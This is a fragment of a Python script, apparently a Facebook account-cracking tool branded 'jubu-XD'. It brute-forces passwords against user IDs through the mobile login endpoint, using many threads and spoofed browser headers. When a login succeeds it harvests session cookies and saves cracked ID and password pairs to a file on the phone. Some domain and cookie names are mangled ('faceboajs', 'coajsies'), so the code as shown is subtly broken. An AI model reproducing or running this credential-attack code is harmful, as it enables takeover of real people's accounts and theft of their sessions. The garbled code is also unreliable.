...
def sykology():
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(emran))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mjubu-ajs.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    global ajss,cps,ugen,loop
    sys.stdout.write(f"\r\033[38;5;46m[jubu-XD] [{fb1}] {loop}|{str(len(ajss))}|0");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.faceboajs.com').text
            ...
            update= {"authority": f'{fb}.faceboajs.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.faceboajs.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.faceboajs.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            eehhcc=session.coajsies.get_dict().keys()
            if "c_user" in eehhcc:
                cajsi=";".join([key+"="+value for key,value in session.coajsies.get_dict().items()])
                sort=cajsi.split("sb=")[1]
                cajsi1=cajsi.split("1000")[1]
                xd="1000"+cajsi1[0:11]
                print(f"\r\r\033[38;5;46m[jubu-ajs] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COajsIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/jubu-ajs.txt","a").write(xd+"|"+ps+"\n")
                ajss.append(uid)
                break
            else:
                continue
